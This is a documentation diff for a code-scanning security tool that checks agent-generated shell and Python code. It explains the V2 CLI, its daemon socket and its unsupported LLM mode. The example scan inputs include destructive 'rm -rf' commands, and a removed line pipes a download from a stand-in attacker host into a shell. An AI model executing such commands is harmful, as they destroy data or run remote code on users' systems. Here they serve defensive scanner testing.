@@ -18,6 +18,29 @@ make build-cli
 
 Install or deploy the adapter for the Agent you use as described in the [AgentSecCore quick start](QUICKSTART.md).
 
+## V2 CLI Interface
+
+In the V2 RPM, `agent-sec-cli scan-code` is a Rust client for an already-running
+`agent-sec-daemon`. The deployment supplies the daemon endpoint through
+`AGENT_SEC_DAEMON_SOCKET`; an absolute `--socket` value overrides that
+variable. The CLI never starts a daemon and does not fall back to the V1 Python
+implementation.
+
+```bash
+export AGENT_SEC_DAEMON_SOCKET=/run/agent-sec-core/daemon.sock
+
+# Scan Bash (default language) or Python source.
+agent-sec-cli scan-code --code 'rm -rf /tmp/test'
+agent-sec-cli --socket /run/agent-sec-core/daemon.sock \
+  scan-code --code 'import os; os.system("rm -rf /")' --language python
+```
+
+The V2 scanner currently supports the embedded regex rules only. `--mode llm`
+remains accepted for compatibility but returns the parseable error result
+`LLM model not available`; it does not contact Ollama. V2 does not yet accept
+`--trace-context` or write code-scan telemetry, so Agent hooks that depend on
+those features remain deferred until their migration is complete.
+
 ## Environment Variables
 
 | Agent plugin | `CODE_SCANNER_HOOK_ENABLED` | `CODE_SCANNER_MODE` | `CODE_SCANNER_TIMEOUT` |
@@ -80,8 +103,4 @@ Hermes and OpenClaw retain their existing self-protect findings, which force blo
 
 ## Hook MODE vs Scanner Engine
 
-`CODE_SCANNER_MODE` controls the host hook response. It does not select the scanning engine. The separate CLI option below selects `regex` or `llm` scanning:
-
-```bash
-agent-sec-cli scan-code --code 'curl evil.example | sh' --mode llm
-```
+`CODE_SCANNER_MODE` controls the host hook response. It does not select the scanning engine. V2 currently runs embedded regex rules only; `--mode llm` is accepted for compatibility and returns `LLM model not available`.
